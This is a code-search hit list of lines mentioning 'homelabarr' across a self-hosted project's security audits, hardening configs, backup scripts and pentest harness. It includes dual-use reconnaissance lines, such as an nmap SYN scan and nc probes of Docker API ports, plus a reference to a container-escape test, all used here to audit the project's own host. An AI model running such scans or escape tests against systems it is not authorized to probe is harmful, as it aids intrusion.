| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `3. **Generate and publish the disclosure PGP key.** 'gpg --quick-gen-key reporting@homelabarr.com ed25519'. Publish the ` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `4. **Submit 'homelabarr.com' to https://hstspreload.org** AFTER M-R8-7 ships and you've confirmed every subdomain you pu` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `6. Encrypt the database on the FIRST upgrade to v2.3.0:  'docker compose exec backend bash scripts/encrypt-db.sh /app/da` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `Advisory: https://github.com/imogenlabs/homelabarr-ce/security/advisories/new` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `BACKUP_LOCAL="${BACKUP_LOCAL:-/var/backups/homelabarr}"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `Email <reporting@homelabarr.com> (preferred) or open a GitHub Security` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `GET https://ce-demo.homelabarr.com → 200, HTTP/2, server: nginx (Traefik proxy in front)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `H-R8-2   /etc/fail2ban/filter.d/homelabarr.conf + jail config parses the` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `H-R8-4   /etc/apparmor.d/homelabarr-backend confines the backend` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `Inferred topology: Cloudflare or LE-signed certs at Traefik → routes '/' and '/api/' to the internal 'homelabarr-front` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `LATEST_DB="$(ls -1t /var/backups/homelabarr/homelabarr.*.db 2>/dev/null \| head -1)"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `LATEST_SECRETS="$(ls -1t /var/backups/homelabarr/secrets.*.tar.zst 2>/dev/null \| head -1)"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `PGP key:             https://homelabarr.com/.well-known/pgp-key.asc` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `PROJECT_DIR="${PROJECT_DIR:-/opt/homelabarr}"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `[homelabarr]` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `'/etc/fail2ban/jail.d/homelabarr.conf'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 3 x | `aa-status \| grep homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `apparmor_parser -r /etc/apparmor.d/homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `bash scripts/backup.sh                 # writes ./backups/homelabarr.<STAMP>.db and ./backups/secrets.<STAMP>.tar.zst` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `cat >/etc/apparmor.d/homelabarr-backend <<'EOF'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `curl -s -o /dev/null -w '%{http_code}\n' https://ce-demo.homelabarr.com/api/health/detail` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/api/health \| jq 'keys'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/ \| tr -d '\r' \| grep -i '^server:'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/ \| tr -d '\r' \| grep -i '^strict-transport-security:'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/ \| tr -d '\r' \| grep -i ^server:` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/ \| tr -d '\r' \| grep -i strict-transport-security` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 2 x | `docker exec homelabarr-backend node -e "` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `docker exec homelabarr-backend sh -c 'touch /etc/foo 2>&1; echo rc=$?'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `docker exec homelabarr-backend sh -c 'touch /etc/x 2>&1'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `docker inspect homelabarr-backend --format '{{ .HostConfig.SecurityOpt }}'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `encrypt-db:  ; docker compose exec backend bash scripts/encrypt-db.sh /app/data/homelabarr.db /run/secrets/sqlcipher_key` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 2 x | `fail2ban-client status homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `fail2ban-client status homelabarr \| grep 'Total banned'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `fail2ban-regex /var/lib/docker/volumes/homelabarr-activity/_data/audit.jsonl /etc/fail2ban/filter.d/homelabarr.conf` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `filter   = homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `git clone https://github.com/imogenlabs/homelabarr-ce && cd homelabarr-ce && git checkout v2.3.0` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `grep -cE 'ghcr.io/imogenlabs/homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `image: ghcr.io/imogenlabs/homelabarr-backend:v2.3.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `image: ghcr.io/imogenlabs/homelabarr-frontend:v2.3.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `is the homelabarr-internal Docker network. No mTLS required.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `logpath  = /var/lib/docker/volumes/homelabarr-activity/_data/audit-*.jsonl` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `ls -1t /var/backups/homelabarr/*.db \| head -1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `ls -la /var/backups/homelabarr/*.db \| head -3` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `nc -vz -w 3 <homelabarr-host> 2375 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `nc -vz -w 3 <homelabarr-host> 2376 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 2 x | `nmap -sS -p 1-1024 -Pn <homelabarr-host>` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `profile homelabarr-backend flags=(attach_disconnected,mediate_deleted) {` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `rclone ls "$BACKUP_REMOTE/" \| grep homelabarr \| head -3   # or rsync --list-only ...` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 2 x | `sudo bash /opt/homelabarr/scripts/restore-drill.sh` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `\| **R9** \| Application-layer DAST — automated OWASP ZAP baseline against ce-demo.homelabarr.com on each merge to mai` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `\| 'scripts/migrate-config-to-db.js' (H-R7-6) \| source \| **FAIL — defer to R8.5-drift-3** (kv_secrets migration not ` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `      ZAP_TARGET: ${{ inputs.target \|\| 'https://ce-demo.homelabarr.com' }}` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `  - homelabarr.yml: apparmor= line for backend + frontend` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `# Expect: ["apparmor=homelabarr-backend","no-new-privileges:true"]` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `### H-R9.5-6 — homelabarr.yml security_opt block missing 'apparmor=' line` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `**Owner verification step:** run 'curl -sI https://ce-demo.homelabarr.com/ \| grep -i strict-transport'. If the value st` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-9-dast-zap@115cf4b97c' + live 'ce-demo.homelabarr.com'` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `*Generated 2026-05-22T20:04:08.994Z — source: byte-level scan of 'security/round-9-dast-zap@115cf4b97c' via GitHub API` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `+      - apparmor=homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `+      - apparmor=homelabarr-frontend` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `+++ b/homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `+aa-enforce /etc/apparmor.d/homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `+aa-enforce /etc/apparmor.d/homelabarr-frontend 2>/dev/null \|\| true` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `+echo 'AppArmor: homelabarr profiles in enforce mode'` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `+if ! aa-status \| grep -E 'homelabarr-(backend\|frontend)' \| grep -q 'enforce'; then` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `+pgp_key_url:  https://github.com/smashingtags.gpg` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `--- a/homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `HSTS=$(curl -sI https://ce-demo.homelabarr.com/ \| grep -i '^strict-transport-security:' \| tr -d '\r')` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `JWT=$(curl -fsS -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `M=$(curl -fsS -H "Authorization: Bearer $JWT" https://ce-demo.homelabarr.com/api/_routes)` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `R=$(curl -fsS -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `These were R8 H-R8-5 deliverables. R9 didn't ship them. The spec is in 'homelabarr-ce-security-audit-round-8.md' (alread` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `curl -fsS -X POST https://ce-demo.homelabarr.com/api/internal/audit \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `docker inspect homelabarr-backend --format '{{json .HostConfig.SecurityOpt}}'` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `now 2 rounds stale — content in homelabarr-ce-security-audit-round-8.md).` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `sudo aa-status \| grep -E 'homelabarr-(backend\|frontend)' \| grep -q 'enforce' && echo OK_aa` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 2 x | `test "$(curl -fsS -o /dev/null -w '%{http_code}' -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `test "$(curl -fsS -o /dev/null -w '%{http_code}' -X POST https://ce-demo.homelabarr.com/api/internal/audit \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `test "$(curl -fsS -o /dev/null -w '%{http_code}' https://ce-demo.homelabarr.com/api/_routes)" = 401` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `test "$(curl -fsS -o /dev/null -w '%{http_code}' https://ce-demo.homelabarr.com/api/health/detail)" = 401` |
| `docs/audit/homelabarr-ce-security-audit-round-9-5-correction.md` | 1 x | `\| CF-C-2 \| homelabarr.yml 'security_opt: apparmor=homelabarr-backend' \| 'security_opt' block exists, 'no-new-privileg` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `  -C /app/data homelabarr.db audit.db 2>/dev/null \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `  https://ce-demo.homelabarr.com/api/audit?limit=100 \` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-9-5-dast-completion@622ab6f700' + live 'ce-demo.homelabarr.co` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `**Why blocks R10:** R10 includes a "backup tamper detection" scenario. We can't test detection of tampered backups when ` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `*Generated 2026-05-22T20:36:56.379Z — source: byte-level scan of 'security/round-9-5-dast-completion@622ab6f700' + liv` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `- homelabarr.yml: 'apparmor=homelabarr-backend' line in security_opt ✓` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `GET https://ce-demo.homelabarr.com/api/health/detail` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `LOCAL_DIR="${LOCAL_DIR:-/var/backups/homelabarr}"` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `OUT="${LOCAL_DIR}/homelabarr-${TS}.tar"` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `curl -fsS https://ce-demo.homelabarr.com/.well-known/security.txt \| grep -q '^Contact:'` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `find "$LOCAL_DIR" -name 'homelabarr-*.gpg' -mtime +14 -delete` |
| `docs/audit/homelabarr-ce-security-audit-round-9-6-correction.md` | 1 x | `test "$(curl -fsS -o /dev/null -w '%{http_code}' https://ce-demo.homelabarr.com/api/health/detail)" = 401 \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `          TARGET='${{ inputs.target \|\| vars.DAST_TARGET \|\| 'https://ce-demo.homelabarr.com' }}'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `        - 'https://ce-demo.homelabarr.com/api/auth/forgot-password.*'  # don't spam the email queue` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `        - 'https://ce-demo.homelabarr.com/api/auth/reset-password.*'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `      - 'homelabarr.yml'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `      ZAP_TARGET: ${{ inputs.target \|\| 'https://ce-demo.homelabarr.com' }}` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `      includePaths: ['https://ce-demo.homelabarr.com/.*']` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `      urls: ['https://ce-demo.homelabarr.com']` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `    "https://ce-demo.homelabarr.com/api/applications/$P")` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `    "https://ce-demo.homelabarr.com/api/containers$P")` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `    - name: homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `    https://ce-demo.homelabarr.com/api/audit?limit=1 \|\| true` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `  - homelabarr-ce-security-audit-round-8.md (prior, committed in security/round-8-deployment-runbook)` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `#     repos/smashingtags/homelabarr-ce/branches/main/protection \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `# (run on host) aa-status \| grep homelabarr-backend \| grep enforce` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ commit on 'security/round-8-deployment-runbook' (06cafcc8bf) + live 'ce-demo.` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `*Generated 2026-05-22T19:18:31.547Z — source: passive recon of 'ce-demo.homelabarr.com' + read-only review of 'securit` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+      - apparmor=homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+  -C /app/data homelabarr.db audit.db \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+++ b/homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+LOCAL_DIR="${LOCAL_DIR:-/var/backups/homelabarr}"` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+OUT="${LOCAL_DIR}/homelabarr-${TS}.tar"` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+aa-enforce /etc/apparmor.d/homelabarr-backend` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+aa-enforce /etc/apparmor.d/homelabarr-frontend 2>/dev/null \|\| true` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+aa-status \| grep -E 'homelabarr-(backend\|frontend)' \| grep -q 'enforce' \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+canary:       https://ce-demo.homelabarr.com/.well-known/security.txt` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+echo 'AppArmor: homelabarr profiles in enforce mode'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+find "$LOCAL_DIR" -name 'homelabarr-*.gpg' -mtime +14 -delete` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `+pgp_key_url:  https://github.com/smashingtags.gpg` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `- Live 'ce-demo.homelabarr.com' has CF in front + Traefik + 5 containers. HSTS preload confirmed. Bundle 'index-BfJq5FsW` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `--- a/homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `-OUT="/var/backups/homelabarr/${TS}.tar.gz"` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `-tar -C /app/data -czf "$OUT" homelabarr.db` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `1. I'll re-verify with '?_v=r9verify' cache-bust against 'ce-demo.homelabarr.com'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `After the agent ships R9, run these on a clean checkout + against 'ce-demo.homelabarr.com'. Each one is shell-executable` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `Canonical: https://ce-demo.homelabarr.com/.well-known/security.txt` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `Contact: https://github.com/imogenlabs/homelabarr-ce/security/advisories/new` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `H=$(curl -sI https://ce-demo.homelabarr.com/api/applications)` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `JWT=$(curl -fsS -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `Net-new files. Spec stays as written in R8 §3 H-R8-5 (Topology A vs B + mTLS chain) — agent should reference homelaba` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `POST=$(curl -fsS -H "Authorization: Bearer $JWT" 'https://ce-demo.homelabarr.com/api/audit?limit=1' \| jq -r '.chain.ok'` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `PRE=$(curl -fsS -H "Authorization: Bearer $JWT" 'https://ce-demo.homelabarr.com/api/audit?limit=1' \| jq -r '.chain.ok')` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `Policy: https://github.com/imogenlabs/homelabarr-ce/blob/main/SECURITY.md` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `R=$(curl -fsS -H "Authorization: Bearer $JWT" https://ce-demo.homelabarr.com/api/_routes)` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `R=$(curl -fsS -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `Round 9 builds the **outside-in attack surface verifier**: an automated DAST pipeline that runs in CI on every PR + on a` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `curl -fsS -H "Authorization: Bearer $JWT" https://ce-demo.homelabarr.com/api/audit?limit=50 \| jq -e '[.events[].event] ` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 2 x | `curl -fsS -o /dev/null -w '%{http_code}' -X POST https://ce-demo.homelabarr.com/api/auth/cli-mint \` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `curl -fsS https://ce-demo.homelabarr.com/api/health \| jq -e 'keys\|sort == ["ok","state","ts"]' > /dev/null && echo 'OK` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `test "$(curl -fsS -o /dev/null -w '%{http_code}' https://ce-demo.homelabarr.com/api/health/detail)" = 401 \|\| { echo FA` |
| `docs/audit/homelabarr-ce-security-audit-round-9.md` | 1 x | `\| H-R8-2 \| fail2ban filter + jail \| 'docs/fail2ban/homelabarr-filter.conf' (129B) + 'homelabarr-jail.conf' (268B). Pa` |
| `docs/decisions/0001-password-hash.md` | 1 x | `**Decision maker:** smashingtags` |
| `docs/demo-reset.md` | 1 x | `           /usr/local/bin/homelabarr-demo-reset` |
| `docs/demo-reset.md` | 1 x | `  printf 'WEBHOOK_URL=https://discord.com/api/webhooks/…\n' \| sudo tee /etc/homelabarr/demo-reset.env` |
| `docs/demo-reset.md` | 1 x | `  sudo chmod 600 /etc/homelabarr/demo-reset.env` |
| `docs/demo-reset.md` | 1 x | `  sudo install -d -m 755 /etc/homelabarr` |
| `docs/demo-reset.md` | 1 x | `2. Removes the three volumes by name: 'compose_homelabarr-demo-{config,data,activity}'.` |
| `docs/demo-reset.md` | 1 x | `7. Waits for 'https://demo.homelabarr.com/api/applications' to return 'totalApps: 117'.` |
| `docs/demo-reset.md` | 1 x | `Keeps 'demo.homelabarr.com' usable by strangers.` |
| `docs/demo-reset.md` | 1 x | `container homelabarr-demo-backend is unhealthy"* — which failed the reset on its very` |
| `docs/demo-reset.md` | 1 x | `journalctl -u homelabarr-demo-reset.service -n 50` |
| `docs/demo-reset.md` | 1 x | `sudo install -m 644 scripts/demo-reset/homelabarr-demo-reset.service /etc/systemd/system/` |
| `docs/demo-reset.md` | 1 x | `sudo install -m 644 scripts/demo-reset/homelabarr-demo-reset.timer /etc/systemd/system/` |
| `docs/demo-reset.md` | 1 x | `sudo install -m 755 scripts/demo-reset/homelabarr-demo-reset /usr/local/bin/` |
| `docs/demo-reset.md` | 1 x | `sudo rm -f /etc/systemd/system/homelabarr-demo-reset.{service,timer} \` |
| `docs/demo-reset.md` | 1 x | `sudo systemctl disable --now homelabarr-demo-reset.timer` |
| `docs/demo-reset.md` | 1 x | `sudo systemctl enable --now homelabarr-demo-reset.timer` |
| `docs/demo-reset.md` | 1 x | `sudo systemctl start homelabarr-demo-reset.service` |
| `docs/demo-reset.md` | 1 x | `systemctl list-timers homelabarr-demo-reset.timer` |
| `docs/demo-reset.md` | 1 x | `systemctl status homelabarr-demo-reset.service` |
| `docs/demo-reset.md` | 1 x | `the same directory, which runs **homelabarr.com, mjashley.com, eightly, imogenlabs,` |
| `docs/demo-reset.md` | 1 x | `\| Config (optional webhook) \| '/etc/homelabarr/demo-reset.env', mode 600 \|` |
| `docs/demo-reset.md` | 1 x | `\| Script \| '/usr/local/bin/homelabarr-demo-reset' \|` |
| `docs/demo-reset.md` | 1 x | `\| Timer \| '/etc/systemd/system/homelabarr-demo-reset.timer', at ':07' and ':37' \|` |
| `docs/demo-reset.md` | 1 x | `\| Unit \| '/etc/systemd/system/homelabarr-demo-reset.service' \|` |
| `docs/dr-drill.sh` | 1 x | `  echo "Usage: $0 <path/to/homelabarr.STAMP.db> <path/to/secrets.STAMP.tar.zst>"` |
| `docs/dr-drill.sh` | 1 x | `docker cp "$BACKUP_DB" homelabarr-backend:/app/data/homelabarr.db` |
| `docs/fail2ban/homelabarr-jail.conf` | 1 x | `           /var/lib/docker/volumes/*homelabarr-activity*/_data/audit.jsonl` |
| `docs/fail2ban/homelabarr-jail.conf` | 1 x | `[homelabarr]` |
| `docs/fail2ban/homelabarr-jail.conf` | 1 x | `filter   = homelabarr` |
| `docs/fail2ban/homelabarr-jail.conf` | 1 x | `logpath  = /var/lib/docker/volumes/*homelabarr-activity*/_data/audit-*.jsonl` |
| `docs/governance/github-security-settings.md` | 1 x | `These settings must be enabled at 'Settings → Code security and analysis' for the 'imogenlabs/homelabarr-ce' repositor` |
| `docs/governance/github-security-settings.md` | 1 x | `gh api repos/imogenlabs/homelabarr-ce --jq '.security_and_analysis'` |
| `docs/governance/github-security-settings.md` | 1 x | `gh api repos/imogenlabs/homelabarr-ce/private-vulnerability-reporting` |
| `docs/hypervisor-alerting.md` | 1 x | `  /usr/local/bin/homelabarr-host-alert; echo $?   # expect 1, and /tmp/s must not exist` |
| `docs/hypervisor-alerting.md` | 1 x | `/usr/local/bin/homelabarr-host-alert` |
| `docs/hypervisor-alerting.md` | 1 x | `/usr/local/bin/homelabarr-host-alert; echo $?` |
| `docs/hypervisor-alerting.md` | 1 x | `DISK_THRESHOLD=50 /usr/local/bin/homelabarr-host-alert` |
| `docs/hypervisor-alerting.md` | 1 x | `HOMELABARR_ALERT_ENV=/dev/null /usr/local/bin/homelabarr-host-alert; echo $?   # expect 78` |
| `docs/hypervisor-alerting.md` | 1 x | `HOMELABARR_ALERT_ENV=/tmp/broken.env HOMELABARR_ALERT_STATE=/tmp/s DISK_THRESHOLD=50 \` |
| `docs/hypervisor-alerting.md` | 1 x | `'/etc/homelabarr/host-alert.env' (mode 600, root-only) holds:` |
| `docs/hypervisor-alerting.md` | 1 x | `\| Config (delivery) \| '/etc/homelabarr/host-alert.env', mode 600 \|` |
| `docs/hypervisor-alerting.md` | 1 x | `\| Script \| '/usr/local/bin/homelabarr-host-alert' \|` |
| `docs/hypervisor-alerting.md` | 1 x | `\| State \| '/var/lib/homelabarr/host-alert.state' \|` |
| `docs/hypervisor-alerting.md` | 1 x | `\| Timer \| '/etc/systemd/system/homelabarr-host-alert.timer', every 5 min \|` |
| `docs/hypervisor-alerting.md` | 1 x | `\| Unit \| '/etc/systemd/system/homelabarr-host-alert.service' \|` |
| `docs/internal/OWNER-PUNCHLIST.md` | 1 x | `# Owner Punch-List — homelabarr-ce` |
| `docs/ir/02-on-call-and-contacts.md` | 1 x | `Single operator: @smashingtags. No formal rotation.` |
| `docs/ir/02-on-call-and-contacts.md` | 1 x | `\| GitHub \| @smashingtags \| Image / repo intervention \|` |
| `docs/ir/03-comms-templates.md` | 1 x | `> [<UTC time>] Investigating a potential issue with the demo (demo.homelabarr.com). We have signal from <sensor>. Servic` |
| `docs/ir/06-tabletop-exercises.md` | 1 x | `> You notice a new tag for 'homelabarr-backend' on GHCR that you didn't push.` |
| `docs/ir/playbooks/PB-11-security-update-past-sla.md` | 1 x | `1. Confirm new image is running on the demo (VPS): 'docker inspect homelabarr-demo-backend --format '{{.Config.Image}}''` |
| `docs/ir/playbooks/PB-11-security-update-past-sla.md` | 1 x | `4. Deploy to ce-dev, run pentest atomics, then promote to the demo (demo.homelabarr.com, on the VPS)` |
| `docs/observability-log-shipping.md` | 1 x | `      - homelabarr-activity:/audit:ro` |
| `docs/observability-log-shipping.md` | 1 x | `      - homelabarr-internal` |
| `docs/threat-model/02-trust-boundaries.md` | 1 x | `3. **nginx → backend container** — HTTP over Docker bridge network. Auth: none (network isolation is the boundary). ` |
| `docs/threat-model/07-residual-risk.md` | 1 x | `\| Single-node demo, no multi-region failover \| demo.homelabarr.com is a demo, not prod \| ACCEPTED \| R8 backup + R12 ` |
| `docs/topology.md` | 1 x | `1. Generate a CA: 'step ca init --name homelabarr-ca'` |
| `docs/topology.md` | 1 x | `All containers on one Docker host behind Traefik. The 'homelabarr-internal' bridge network is the trust boundary.` |
| `pentest/README.md` | 1 x | `docker exec homelabarr-backend sh -c 'cd /app && bash pentest/atomics/T1611-escape-to-host/test.sh'` |
| `pentest/README.md` | 1 x | `export ART_TARGET=https://dev.homelabarr.com` |
| `pentest/atomics/audit-continuity/09-audit-log-continuity.sh` | 1 x | `BASE="${ART_TARGET:-https://dev.homelabarr.com}"` |
| `pentest/harness/env.example` | 1 x | `ART_TARGET=https://dev.homelabarr.com` |
| `pentest/harness/run.sh` | 1 x | `# Usage: ART_TARGET=https://dev.homelabarr.com ./run.sh [--class A1\|A2\|A3\|A4\|A5]` |
| `playwright.config.ts` | 1 x | `const SMOKE_URL = process.env.TEST_BASE_URL \|\| 'https://ce-dev.homelabarr.com';` |
